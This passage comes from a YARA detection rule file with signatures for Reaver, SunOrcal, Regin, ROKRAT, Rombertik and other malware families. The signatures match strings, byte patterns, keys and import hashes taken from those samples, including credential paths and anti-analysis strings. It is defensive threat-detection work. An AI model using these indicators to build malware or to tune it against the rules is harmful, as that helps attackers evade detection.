description = \"Reaver malware\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Reaver\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Reaver3_Malware_Nov17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"CPL.dll\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and pe.imphash() == \"e722dd50a0e2bc0cab8ca35fc4bf6d99\" and all of them)\n}\n\nrule Reaver3_Malware_Nov17_2\n{\n    meta:\n        description = \"Reaver malware\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Reaver\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Reaver3_Malware_Nov17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"WindowsUpdateReaver\" fullword wide\n        $s1 = \"\\\\WUpdate.~tmp\" fullword ascii\n        $s2 = \"\\\\~WUpdate.lnk\" fullword ascii\n        $s3 = \"\\\\services\\\\\" fullword ascii\n        $s4 = \"moomjufps\" fullword ascii\n        $s5 = \"gekmomkege\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and (pe.imphash() == \"837cc5062a0758335b257ea3b27972b2\" or 1 of ($x*) or 3 of them)\n}\n\nrule Reaver3_Malware_Nov17_3\n{\n    meta:\n        description = \"Reaver malware\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Reaver\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Reaver3_Malware_Nov17_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"winhelp.dat\" fullword ascii\n        $s2 = \"\\\\microsoft\\\\Credentials\\\\\" fullword ascii\n        $s3 = \"~Update.lnk\" fullword ascii\n        $s4 = \"winhelp.cpl\" fullword ascii\n        $s5 = \"\\\\services\\\\\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and (pe.imphash() == \"8ee521b2316ddd6af1679eac9f5ed77b\" or 4 of them)\n}\n\nrule SunOrcal_Malware_Nov17_1\n{\n    meta:\n        description = \"Reaver malware\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/11/unit42-new-malware-with-ties-to-sunorcal-discovered/\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Reaver\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SunOrcal_Malware_Nov17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"kQZ6l5t1kAlsjmBzsCZPrSpQn5tFrChLtTdsgTlOsClKt5pBsDdFrSVshnxMr6ZOpn9slndBsy1jq6lIr216rSNApn9P\" fullword ascii\n        $x2 = { 00 00 00 00 00 00 00 00 00 00 00 00 21 21 21 73\n              79 73 74 65 6D 00 00 00 00 00 00 00 00 00 00 00 }\n        $x3 = \"!!!url!!!\" fullword ascii\n        $x4 = \"h4NcbkdLrCpFpPQ=\" fullword ascii\n        $x5 = \"GloablCryptNv1\" fullword ascii\n        $x6 = \"Gloabl\\\\CryptNv1\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and 1 of them\n}\n\nrule Regin_APT_KernelDriver_Generic_A\n{\n    meta:\n        description = \"Regin malware\"\n        ref = \"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/regin-analysis.pdf\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@Malwrsignatures - included in APT Scanner THOR\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Regin_APT_KernelDriver_Generic_A\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $m0 = { 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 }\n        $m1 = { 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e }\n        $s0 = \"atapi.sys\" fullword wide\n        $s1 = \"disk.sys\" fullword wide\n        $s3 = \"h.data\" fullword ascii\n        $s4 = \"\\\\system32\" fullword ascii\n        $s5 = \"\\\\SystemRoot\" fullword ascii\n        $s6 = \"system\" fullword ascii\n        $s7 = \"temp\" fullword ascii\n        $s8 = \"windows\" fullword ascii\n        $x1 = \"LRich6\" fullword ascii\n        $x2 = \"KeServiceDescriptorTable\" fullword ascii\n\n    condition:\n        $m0 at 0 and $m1 and all of ($s*) and 1 of ($x*)\n}\n\nrule Regin_APT_KernelDriver_Generic_B\n{\n    meta:\n        description = \"Regin espionage malware\"\n        ref = \"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/regin-analysis.pdf\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@Malwrsignatures - included in APT Scanner THOR\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Regin_APT_KernelDriver_Generic_B\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $m0 = { 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 }\n        $s1 = { 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e }\n        $s2 = \"H.data\" fullword ascii nocase\n        $s3 = \"INIT\" fullword ascii\n        $s4 = \"ntoskrnl.exe\" fullword ascii\n        $v1 = \"\\\\system32\" fullword ascii\n        $v2 = \"\\\\SystemRoot\" fullword ascii\n        $v3 = \"KeServiceDescriptorTable\" fullword ascii\n        $w1 = \"\\\\system32\" fullword ascii\n        $w2 = \"\\\\SystemRoot\" fullword ascii\n        $w3 = \"LRich6\" fullword ascii\n        $x1 = \"_snprintf\" fullword ascii\n        $x2 = \"_except_handler3\" fullword ascii\n        $y1 = \"mbstowcs\" fullword ascii\n        $y2 = \"wcstombs\" fullword ascii\n        $y3 = \"KeGetCurrentIrql\" fullword ascii\n        $z1 = \"wcscpy\" fullword ascii\n        $z2 = \"ZwCreateFile\" fullword ascii\n        $z3 = \"ZwQueryInformationFile\" fullword ascii\n        $z4 = \"wcslen\" fullword ascii\n        $z5 = \"atoi\" fullword ascii\n\n    condition:\n        $m0 at 0 and all of ($s*) and (all of ($v*) or all of ($w*) or all of ($x*) or all of ($y*) or all of ($z*)) and filesize < 20KB\n}\n\nrule Regin_APT_KernelDriver_Generic_C\n{\n    meta:\n        description = \"Regin espionage malware\"\n        ref = \"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/regin-analysis.pdf\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@Malwrsignatures - included in APT Scanner THOR\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Regin_APT_KernelDriver_Generic_C\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $m0 = { 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 }\n        $s0 = \"KeGetCurrentIrql\" fullword ascii\n        $s1 = \"5.2.3790.0 (srv03_rtm.030324-2048)\" fullword wide\n        $s2 = \"usbclass\" fullword wide\n        $x1 = \"PADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING\" ascii\n        $x2 = \"Universal Serial Bus Class Driver\" fullword wide\n        $x3 = \"5.2.3790.0\" fullword wide\n        $y1 = \"LSA Shell\" fullword wide\n        $y2 = \"0Richw\" fullword ascii\n\n    condition:\n        $m0 at 0 and all of ($s*) and (all of ($x*) or all of ($y*)) and filesize < 20KB\n}\n\nrule Regin_sig_svcsstat\n{\n    meta:\n        description = \"Regin espionage malware\"\n        ref = \"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/regin-analysis.pdf\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@MalwrSignatures\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Regin_sig_svcsstat\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Service Control Manager\" fullword ascii\n        $s1 = \"_vsnwprintf\" fullword ascii\n        $s2 = \"Root Agency\" fullword ascii\n        $s3 = \"Root Agency0\" fullword ascii\n        $s4 = \"StartServiceCtrlDispatcherA\" fullword ascii\n        $s5 = \"\\\\\\\\?\\\\UNC\" fullword wide\n        $s6 = \"%ls%ls\" fullword wide\n\n    condition:\n        all of them and filesize < 15KB and filesize > 10KB\n}\n\nrule Regin_Sample_3\n{\n    meta:\n        description = \"Regin espionage malware\"\n        ref = \"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/regin-analysis.pdf\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@Malwrsignatures\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Regin_Sample_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $hd = { fe ba dc fe }\n        $s0 = \"Service Pack x\" fullword wide\n        $s1 = \"\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\" fullword wide\n        $s2 = \"\\\\REGISTRY\\\\Machine\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\HotFix\" fullword wide\n        $s3 = \"mntoskrnl.exe\" fullword wide\n        $s4 = \"\\\\REGISTRY\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Memory Management\" fullword wide\n        $s5 = \"Memory location: 0x%p, size 0x%08x\" wide fullword\n        $s6 = \"Service Pack\" fullword wide\n        $s7 = \".sys\" fullword wide\n        $s8 = \".dll\" fullword wide\n        $s10 = \"\\\\REGISTRY\\\\Machine\\\\Software\\\\Microsoft\\\\Updates\" fullword wide\n        $s11 = \"IoGetRelatedDeviceObject\" fullword ascii\n        $s12 = \"VMEM.sys\" fullword ascii\n        $s13 = \"RtlGetVersion\" fullword wide\n        $s14 = \"ntkrnlpa.exe\" fullword ascii\n\n    condition:\n        ($hd at 0) and all of ($s*) and filesize > 160KB and filesize < 200KB\n}\n\nrule Regin_Sample_Set_2\n{\n    meta:\n        description = \"Regin espionage malware\"\n        ref = \"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/regin-analysis.pdf\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@MalwrSignatures\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Regin_Sample_Set_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $hd = { fe ba dc fe }\n        $s0 = \"d%ls%ls\" fullword wide\n        $s1 = \"\\\\\\\\?\\\\UNC\" fullword wide\n        $s2 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\" fullword wide\n        $s3 = \"\\\\\\\\?\\\\UNC\\\\\" fullword wide\n        $s4 = \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\" fullword wide\n        $s5 = \"System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Linkage\" wide fullword\n        $s6 = \"\\\\\\\\.\\\\Global\\\\%s\" fullword wide\n        $s7 = \"temp\" fullword wide\n        $s8 = \"\\\\\\\\.\\\\%s\" fullword wide\n        $s9 = \"Memory location: 0x%p, size 0x%08x\" fullword wide\n        $s10 = \"sscanf\" fullword ascii\n        $s11 = \"disp.dll\" fullword ascii\n        $s12 = \"%x:%x:%x:%x:%x:%x:%x:%x%c\" fullword ascii\n        $s13 = \"%d.%d.%d.%d%c\" fullword ascii\n        $s14 = \"imagehlp.dll\" fullword ascii\n        $s15 = \"%hd %d\" fullword ascii\n\n    condition:\n        ($hd at 0) and all of ($s*) and filesize < 450KB and filesize > 360KB\n}\n\nrule Regin_legspin\n{\n    meta:\n        description = \"Regin espionage malware Legspin module\"\n        ref = \"https://securelist.com/blog/research/68438/an-analysis-of-regins-hopscotch-and-legspin/\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_regin_legspin\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"sharepw\"\n        $a2 = \"reglist\"\n        $a3 = \"logdump\"\n        $a4 = \"Name:\" wide\n        $a5 = \"Phys Avail:\"\n        $a6 = \"cmd.exe\" wide\n        $a7 = \"ping.exe\" wide\n        $a8 = \"millisecs\"\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($a*)\n}\n\nrule Regin_hopscotch\n{\n    meta:\n        description = \"Regin espionage malware Hopscotch module\"\n        ref = \"https://securelist.com/blog/research/68438/an-analysis-of-regins-hopscotch-and-legspin/\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_regin_hopscotch\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"AuthenticateNetUseIpc\"\n        $a2 = \"Failed to authenticate to\"\n        $a3 = \"Failed to disconnect from\"\n        $a4 = \"%S\\\\ipc$\" wide\n        $a5 = \"Not deleting...\"\n        $a6 = \"CopyServiceToRemoteMachine\"\n        $a7 = \"DH Exchange failed\"\n        $a8 = \"ConnectToNamedPipes\"\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($a*)\n}\n\nrule Regin_2011_32bit_stage1\n{\n    meta:\n        description = \"Regin espionage malware 32-bit stage-1 loader\"\n        ref = \"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/regin-analysis.pdf\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_regin_2011_32bit_stage1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $key1 = {331015EA261D38A7}\n        $key2 = {9145A98BA37617DE}\n        $key3 = {EF745F23AA67243D}\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300000 and any of ($key*)\n}\n\nrule Regin_rc5key\n{\n    meta:\n        description = \"Regin espionage malware RC5 keys\"\n        ref = \"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/regin-analysis.pdf\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_regin_rc5key\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $key1 = {73 23 1F 43 93 E1 9F 2F 99 0C 17 81 5C FF B4 01}\n        $key2 = {10 19 53 2A 11 ED A3 74 3F C3 72 3F 9D 94 3D 78}\n\n    condition:\n        any of ($key*)\n}\n\nrule Regin_vfs\n{\n    meta:\n        description = \"Region espionage malware VFS\"\n        ref = \"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/regin-analysis.pdf\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_regin_vfs\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = {00 02 00 08 00 08 03 F6 D7 F3 52}\n        $a2 = {00 10 F0 FF F0 FF 11 C7 7F E8 52}\n        $a3 = {00 04 00 10 00 10 03 C2 D3 1C 93}\n        $a4 = {00 04 00 10 C8 00 04 C8 93 06 D8}\n\n    condition:\n        ($a1 at 0) or ($a2 at 0) or ($a3 at 0) or ($a4 at 0)\n}\n\nrule Regin_dispatcher_disp_dll\n{\n    meta:\n        description = \"Regin espionage malware disp.dll dispatcher\"\n        ref = \"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/regin-analysis.pdf\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_regin_dispatcher_disp_dll\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string1 = \"shit\"\n        $string2 = \"disp.dll\"\n        $string3 = \"255.255.255.255\"\n        $string4 = \"StackWalk64\"\n        $string5 = \"imagehlp.dll\"\n\n    condition:\n        uint16(0) == 0x5a4d and (all of ($string*))\n}\n\nrule Regin_2013_64bit_stage1\n{\n    meta:\n        description = \"Regin espionage malware 64-bit stage-1 loader\"\n        ref = \"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/regin-analysis.pdf\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Regin\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_regin_2013_64bit_stage1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"PRIVHEAD\"\n        $a2 = \"\\\\\\\\.\\\\PhysicalDrive%d\"\n        $a3 = \"ZwDeviceIoControlFile\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100000 and (all of ($a*))\n}\n\nprivate rule RegSubDatCode : RegSubDat Family\n{\n    meta:\n        description = \"RegSubDat code features\"\n        classifications = \"Trojan\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"RegSubDatCode\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $ = { 80 34 3? 99 40 (3D FB 65 00 00 | 3B C6) 7? F? }\n        $ = { 68 FF FF 7F 00 5? }\n        $ = { 68 FF 7F 00 00 5? }\n\n    condition:\n        all of them\n}\n\nprivate rule RegSubDatStrings : RegSubDat Family\n{\n    meta:\n        description = \"RegSubDat Identifying Strings\"\n        classifications = \"Trojan\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"RegSubDatStrings\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    strings:\n        $avg1 = \"Button\"\n        $avg2 = \"Allow\"\n        $avg3 = \"Identity Protection\"\n        $avg4 = \"Allow for all\"\n        $avg5 = \"AVG Firewall Asks For Confirmation\"\n        $mutex = \"0x1A7B4C9F\"\n\n    condition:\n        all of ($avg*) or $mutex\n}\n\nrule RegSubDat : Family\n{\n    meta:\n        description = \"RegSubDat trojan\"\n        classifications = \"Trojan\"\n        threat_names = \"RegSubDat\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/citizenlab/malware-signatures\"\n        original_name = \"RegSubDat\"\n        license = \"CC-4.0 (https://creativecommons.org/licenses/by/4.0/)\"\n\n    condition:\n        RegSubDatCode or RegSubDatStrings\n}\n\nrule RockLoader\n{\n    meta:\n        description = \"RockLoader downloader\"\n        classifications = \"Downloader\"\n        threat_names = \"RockLoader\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@seanmw\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"RockLoader\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $hdr = {4d 5a 90 00}\n        $op1 = {39 45 f0 0f 8e b0 00 00 00}\n        $op2 = {32 03 77 73 70 72 69 6e 74 66 41 00 ce 02 53 65}\n\n    condition:\n        $hdr at 0 and all of ($op*) and filesize < 500KB\n}\n\nrule ROKRAT_Malware\n{\n    meta:\n        description = \"ROKRAT malware\"\n        ref = \"http://blog.talosintelligence.com/2017/04/introducing-rokrat.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"ROKRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ROKRAT_Malware\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"c:\\\\users\\\\appdata\\\\local\\\\svchost.exe\" fullword ascii\n        $x2 = \"c:\\\\temp\\\\episode3.mp4\" fullword ascii\n        $x3 = \"MAC-SIL-TED-FOO-YIM-LAN-WAN-SEC-BIL-TAB\" ascii\n        $x4 = \"c:\\\\temp\\\\%d.tmp\" ascii fullword\n        $s1 = \"%s%s%04d%02d%02d%02d%02d%02d.jar\" fullword ascii\n        $s2 = \"\\\\Aboard\\\\Acm%c%c%c.exe\" fullword ascii\n        $a1 = \"ython\" ascii fullword\n        $a2 = \"iddler\" ascii fullword\n        $a3 = \"egmon\" ascii fullword\n        $a6 = \"iresha\" ascii fullword\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 25000KB and (1 of ($x*) or all of ($a*))) or (5 of them)\n}\n\nrule ROKRAT_Dropper_Nov17\n{\n    meta:\n        description = \"ROKRAT malware dropper\"\n        ref = \"http://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"ROKRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ROKRAT_Dropper_Nov17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2500KB and pe.imphash() == \"c6187b1b5f4433318748457719dd6f39\"\n}\n\nrule ROKRAT_Nov17_1\n{\n    meta:\n        description = \"ROKRAT malware\"\n        classifications = \"Backdoor\"\n        threat_names = \"ROKRAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ROKRAT_Nov17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\T+M\\\\Result\\\\DocPrint.pdb\" ascii\n        $s2 = \"d:\\\\HighSchool\\\\version 13\\\\2ndBD\" ascii\n        $s3 = \"e:\\\\Happy\\\\Work\\\\Source\\\\version\" ascii\n        $x1 = \"\\\\appdata\\\\local\\\\svchost.exe\" ascii\n        $x2 = \"c:\\\\temp\\\\esoftscrap.jpg\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 15000KB and 1 of them)\n}\n\nrule Rombertik_CarbonGrabber\n{\n    meta:\n        description = \"Rombertik / CarbonGrabber spyware\"\n        ref = \"http://blogs.cisco.com/security/talos/rombertik\"\n        classifications = \"Spyware\"\n        threat_names = \"Rombertik\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Rombertik_CarbonGrabber\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"ZwGetWriteWatch\" fullword ascii\n        $x2 = \"OutputDebugStringA\" fullword ascii\n        $x3 = \"malwar\" fullword ascii\n        $x4 = \"sampl\" fullword ascii\n        $x5 = \"viru\" fullword ascii\n        $x6 = \"sandb\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 5MB and all of them\n}\n\nrule Rombertik_CarbonGrabber_Panel_InstallScript\n{\n    meta:\n        description = \"Rombertik / CarbonGrabber spyware panel install script\"\n        ref = \"http://blogs.cisco.com/security/talos/rombertik\"\n        classifications = \"Spyware\"\n        threat_names = \"Rombertik\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Rombertik_CarbonGrabber_Panel_InstallScript\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"$insert = \\\"INSERT INTO `logs` (`id`, `ip`, `name`, `host`, `post`, `time`, `bro\" ascii\n        $s3 = \"`post` text NOT NULL,\" fullword ascii\n        $s4 = \"`host` text NOT NULL,\" fullword ascii\n        $s5 = \") ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;\\\" ;\" fullword ascii\n        $s6 = \"$db->exec($columns); //or die(print_r($db->errorInfo(), true));;\" fullword ascii\n        $s9 = \"$db->exec($insert);\" fullword ascii\n        $s10 = \"`browser` text NOT NULL,\" fullword ascii\n        $s13 = \"`ip` text NOT NULL,\" fullword ascii\n\n    condition:\n        filesize < 3KB and all of them\n}\n\nrule Rombertik_CarbonGrabber_Panel\n{\n    meta:\n        description = \"Rombertik / CarbonGrabber spyware\"\n        ref = \"http://blogs.cisco.com/security/talos/rombertik\"\n        classifications = \"Spyware\"\n        threat_names = \"Rombertik\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Rombertik_CarbonGrabber_Panel\"\n        license = \"GPL-3.0 